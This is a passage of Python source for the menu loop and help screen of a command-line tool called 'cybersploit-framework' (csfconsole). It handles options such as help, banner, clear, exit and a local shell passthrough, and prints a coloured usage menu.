							print ("(•) \033[2;36mTry again with valid option")


				elif (option == 'cmd'):
					os.system('''
						while true; do
						printf "\e[4;2;97m~sys~ \e[4;2;97mCSF\e[0;0;0m > "; read input
						if [[ $input == back || $input == exit ]]; then
						break && exit
						elif [[ $input == $input ]]; then
						$input
						fi
						done
						''')
				elif (option == 'allprograms'):
					__programs__()
				elif (option =='list'):
					print ("(•) \033[2;36mThere is no submodule here!! run 'allprograms' to show modules :)")
				elif (option == 'banner'):
					banner()
				elif (option == 'quit') or (option == 'exit'):
					print ("\033[2;33mEXITING.......!\033[0;0m")
					exit()
				elif (option == 'help'):
					__help__()
				elif (option == 'report'):
					__report__()
				elif (option == 'clear'):
					os.system('''
	clear
						''')
				else:
					print ("(•) \033[4;32mplease try again with a valid option\033[0;0m")
					time.sleep(0.3)
		else:
			print ("\033[1;34mAccess denied")
			print ("\n")
			time.sleep (0.2)
			print ("\033[1;33mbye bye",(name))
			print ("\n")
			exit()

elif (args == '-h' or args == '--help'):
	os.system('''
#<<---colour code sybstitution by variables--->>
B0="$(printf '\033[100m')"
C0="$(printf '\033[96m')"
R0="$(printf '\033[00m')"
#<<----help menue ---->>
printf "        \e[1;37m /\ .__    ._ _  _ .__|_ _._|_o _ ._  __ |_  _ |._  ._ _  _ ._     _\e[0m\n"
printf "        \e[1;33m/--\|(_||_|| | |(/_| ||_(_| |_|(_)| |    | |(/_||_) | | |(/_| ||_|(/_\e[0m\n"
printf "        \e[1;31m      _|                                        |\e[0m\n"

echo
echo -e "
<=========${B0}ARGUMENTS${R0}=======================${B0}USAGE${R0}=====================================>

       ${C0} -h OR --help${R0}               To show argumentation help menue.

       ${C0} -u OR --update${R0}             To update cybersploit-framework! (normally) :)

       ${C0} ~u OR ~~update${R0}             To update cybetsploit-framework! (manually) ;)

       ${C0} -v OR --version${R0}            To show the installed version of cybersploit-framework!
Example:-
      ${C0}csfconsole -h${R0}                To show help menue.  (example of short argument)

      ${C0}csfconsole --help${R0}            To show help menue.  (example of long argument)
<----x---->

>>>${C0} To run cybersploit-framework just run${R0} ${B0}csfconsole${R0}

<----x---->

>>>${C0}Other all arguments will show error message${R0} :/

<<<---END--->>
"
	''')
else:
	print ("\n[!]\033[1;31mInvalid argument!! try using 'csfconsole -h' or 'csfconsole --help' for argumentation help menue\033[0;0m\n")
